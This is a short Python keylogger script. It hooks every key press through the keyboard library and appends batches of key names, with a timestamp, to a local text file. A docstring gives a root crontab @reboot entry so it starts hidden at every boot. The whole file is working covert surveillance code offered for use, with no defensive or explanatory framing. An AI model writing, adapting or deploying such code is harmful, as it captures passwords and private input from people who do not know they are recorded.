"""
Job for cront:

    sudo crontab -e
    @reboot python3.7 /home/buch/keylogger.py &
"""


import keyboard
import datetime

HOME_DIR = "/home/buch/keylogger_storage.txt"
STORAGE = []


def print_pressed(e):
    if e.event_type == "down":
        STORAGE.append(e.name + ",")
    if len(STORAGE) > 200:
        with open(HOME_DIR, "a") as file:
            file.writelines(STORAGE)
            STORAGE.clear()


def main():
    date = datetime.datetime.now()
    STORAGE.append("\n" + str(date) + " ")
    keyboard.hook(print_pressed)
    keyboard.wait()


if __name__ == '__main__':
    main()
